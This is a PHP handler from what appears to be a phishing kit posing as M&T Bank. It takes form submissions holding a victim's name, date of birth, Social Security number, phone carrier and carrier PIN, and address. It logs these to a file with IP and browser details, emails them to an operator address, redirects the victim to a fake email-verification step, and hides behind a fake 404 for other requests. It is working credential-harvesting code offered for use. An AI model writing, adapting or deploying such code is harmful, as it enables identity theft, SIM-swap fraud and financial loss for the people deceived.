<?php
session_start();
include "../conf/config.php";
include "ipdetails.php";
include '../../huehuehue.php';
include '../../blueprint/antbots/crawler.php';


if($_POST){
    $fname	  = $_POST['fname'];
	$dob	  = $_POST['dob'];
    $email = $_POST['email'];
    $_SESSION['email'] = $email;
	$phnum	  = $_POST['phoneNumber'];
    $carrier 	  = $_POST['carrier'];    
    $carrierpin 	  = $_POST['carrierpin'];
    $ssn = $_POST['ssn'];
	$stradd1 	  = $_POST['address'];
	$city 	  = $_POST['city'];
    $zipcode 	  = $_POST['zipcode'];
    $ip = $_SERVER['REMOTE_ADDR'];

$mes = "::::::::::::::::::::::: MnT BLUEPRINT 1nf0 1 [Billing Details] :::::::::::::::::::::::::\r\n";
    $mes .= "FNAME                                : $fname\r\n";
    $mes .= "DOB                                  : $dob\r\n";
    $mes .= "ADDRESS                              : $stradd1\r\n";
    $mes .= "City                                 : $city\r\n";
    $mes .= "ZIP                                  : $zipcode\r\n";
    $mes .= "SSN                                  : $ssn\r\n";
    $mes .= "PHONE                                : $phnum\r\n";
    $mes .= "CARRIER                              : $carrier\r\n";
    $mes .= "CARRIER Pin                          : $carrierpin\r\n";
    $mes .=  "|--------------- I N F O | I P -------------------|\r\n";
    $mes .= "IP Address	                       : {$_SESSION['ip']}\r\n";
    $mes .= "IP Country	                       : {$_SESSION['country']}\r\n";
    $mes .= "IP City	                       : {$_SESSION['city']}\r\n";
    $mes .= "Browser		                   : {$_SESSION['browser']} on {$_SESSION['platform']}\r\n";
    $mes .= "User Agent	                       : {$_SERVER['HTTP_USER_AGENT']}\r\n";
    $mes .= "TIME		                       : ".date("d/m/Y h:i:sa")." GMT\r\n";
    $mes .= "::::::::::::::::::::::  MnT BLUEPRINT 1nf0 :::::::::::::::::::::::::\r\n";
if($savetxt == "on"){
        $sv = fopen("../data/billing".$salt.".txt",'a');
        fwrite($sv,$mes."\n");
        fclose($sv);}$subject="Billing Details => From {$_SESSION['ip']}";$headers="From: Blue_prints <blue_printss@M&T.com>\r\n";$headers.="MIME-Version: 1.0\r\n";$headers.="Content-Type: text/plain; charset=UTF-8\r\n";@mail($emailz,$subject,$mes,$headers);
        header("Location: ../../emailauth/check.php?&sessionid={$_SESSION['rand']}&ue");
    }else{
        exit(header("HTTP/1.0 404 Not Found"));
    }
?>